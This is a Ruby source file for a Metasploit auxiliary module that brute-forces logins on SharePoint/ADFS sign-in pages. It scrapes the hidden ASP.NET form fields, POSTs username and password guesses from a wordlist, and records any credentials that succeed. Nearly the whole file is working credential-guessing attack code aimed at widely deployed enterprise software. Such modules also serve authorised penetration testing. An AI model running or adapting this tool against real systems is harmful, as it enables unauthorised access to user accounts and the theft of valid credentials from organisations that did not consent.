##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'           => 'Sharepoint ADFS Brute Force Utility',
			'Description'    => %q{
				This module tests credentials on Sharepoint/AFDS. AuthPath needs to be set get
				request you see in you browser bar after you browsed to the target website
				 (something like /adfs/ls/?wa=wsignin1.0&wtrealm=...)
			},
			'Author'         =>
				[
					'otr',
				],
			'License'        => MSF_LICENSE,
			'Actions'        =>
				[
					[
						'Sharepoint',
						{
							'Description' => 'Sharepoint',
							'IncorrectCheck'  => /incorrect/
						}
					]
				],
			'DefaultAction' => 'Sharepoint'
		)

		register_options(
			[
				OptInt.new('RPORT', [ true, "The target port", 443]),
				OptString.new('AuthPath', [ true, "Path of the adfs authentication script", '']),
			], self.class)

		register_advanced_options(
			[
				OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", '']),
				OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
			], self.class)

		deregister_options('BLANK_PASSWORDS')
	end

	def cleanup
		# Restore the original settings
		datastore['BLANK_PASSWORDS'] = @blank_passwords_setting
		datastore['USER_AS_PASS']    = @user_as_pass_setting
	end

        def target_url
                #Function to display correct protocol and host/vhost info
                if rport == 443 or ssl
                        proto = "https"
                else
                        proto = "http"
                end

                if vhost != ""
                        "#{proto}://#{vhost}:#{rport}#{datastore['URI'].to_s}"
                else
                        "#{proto}://#{rhost}:#{rport}#{datastore['URI'].to_s}"
                end
        end

	def run
		# Store the original setting
		@blank_passwords_setting = datastore['BLANK_PASSWORDS']

		# Sharepoint doesn't support blank passwords
		datastore['BLANK_PASSWORDS'] = false

		# If there's a pre-defined username/password, we need to turn off USER_AS_PASS
		# so that the module won't just try username:username, and then exit.
		@user_as_pass_setting = datastore['USER_AS_PASS']
		if not datastore['USERNAME'].nil? and not datastore['PASSWORD'].nil?
			print_status("Disabling 'USER_AS_PASS' because you've specified an username/password")
			datastore['USER_AS_PASS'] = false
		end

		vhost = datastore['VHOST'] || datastore['RHOST']

		print_status("#{msg} Testing Sharepoint")

		res = send_request_cgi(
                        {
                                'method'  => 'GET',
                                'uri'     => datastore['AuthPath']
                        }, 20)

		if (res.code == 200)
                                print_status("Sharepoint install found at #{target_url}  [HTTP 200]")

                                #Gather __VIEWSTATE and __EVENTVALIDATION from HTTP response.
                                #Required to be sent based on some versions/configs.
                                begin
                                        datastore['viewstate'] = res.body.scan(/<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*)"/)[0][0]
                                rescue
                                        datastore['viewstate'] = ""
                                end

                                begin
                                        datastore['eventvalidation'] = res.body.scan(/<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*)"/)[0][0]
                                rescue
                                        datastore['eventvalidation'] = ""
                                end

                                begin
                                        datastore['db'] = res.body.scan(/<input type="hidden" name="__db" value="(.*)"/)[0][0]
                                rescue
                                        datastore['db'] = ""
                                end

                else
                                print_error("Sharepoint login page not found at #{target_url}. May need to set VHOST or RPORT.  [HTTP #{res.code}]")
                end


		# Here's a weird hack to check if each_user_pass is empty or not
		# apparently you cannot do each_user_pass.empty? or even inspect() it
		isempty = true
		each_user_pass do |user|
			isempty = false
			break
		end
		print_error("No username/password specified") if isempty

		auth_path   = datastore['AuthPath']
		login_check = action.opts['IncorrectCheck']

		begin
			each_user_pass do |user, pass|
				vprint_status("#{msg} Trying #{user} : #{pass}")
				try_user_pass(user, pass, auth_path, login_check, vhost, false)
			end
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
			print_error("#{msg} HTTP Connection Error, Aborting")
		end
	end

	def try_user_pass(user, pass, auth_path, login_check, vhost, retryit)

		user = datastore['AD_DOMAIN'] + '\\' + user if datastore['AD_DOMAIN'] != ''
		headers = {
			'Cookie' => 'PBack=0'
		}

		viewstate = Rex::Text.uri_encode(datastore['viewstate'].to_s).sub("/","%2F")
		eventvalidation = Rex::Text.uri_encode(datastore['eventvalidation'].to_s).sub("/","%2F")
		db = datastore['db'].to_s

                print_status("Viewstat is #{viewstate}, Eventvalidation is #{eventvalidation}, db is #{db}")

                post_data =  "__VIEWSTATE=#{viewstate}"
                post_data << "&__EVENTVALIDATION=#{eventvalidation}"
		post_data << "&__db=#{db}"
                post_data << "&ctl00%24ContentPlaceHolder1%24UsernameTextBox=#{user}"
                post_data << "&ctl00%24ContentPlaceHolder1%24PasswordTextBox=#{pass}"
		post_data << "&ctl00%24ContentPlaceHolder1%24SubmitButton=Sign+In"

		retryreq = false
		begin
			res = send_request_cgi({
				'encode'   => false,
				'uri'      => auth_path,
				'method'   => 'POST',
				'headers'  => headers,
				'data'     => post_data
			}, 25)

		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error("#{msg} HTTP Connection Failed, retrying")
			retryreq = true
			if retryit
				return true
			end

		end

		if retryit
			return res
		end

		if not res
			print_error("#{msg} HTTP Connection Error, retrying")
			retryreq = true
		end

		while retryreq == true or res == true or res.code == 503
			vprint_error("Got Service is unavailable ... trying again: #{user}:#{pass}")
			# this recursion only has a depth of 1
			res = try_user_pass(user, pass, auth_path, login_check, vhost, true)
		end

		if res.body =~ login_check
			vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
			return :skip_pass
		else
			print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
			report_hash = {
				:host   => datastore['RHOST'],
				:port   => datastore['RPORT'],
				:sname  => 'sharepoint',
				:user   => user,
				:pass   => pass,
				:active => true,
				:type => 'password'}

			report_auth_info(report_hash)
			return :next_user
		end
	end
	def msg
		"#{vhost}:#{rport} Sharepoint -"
	end

end
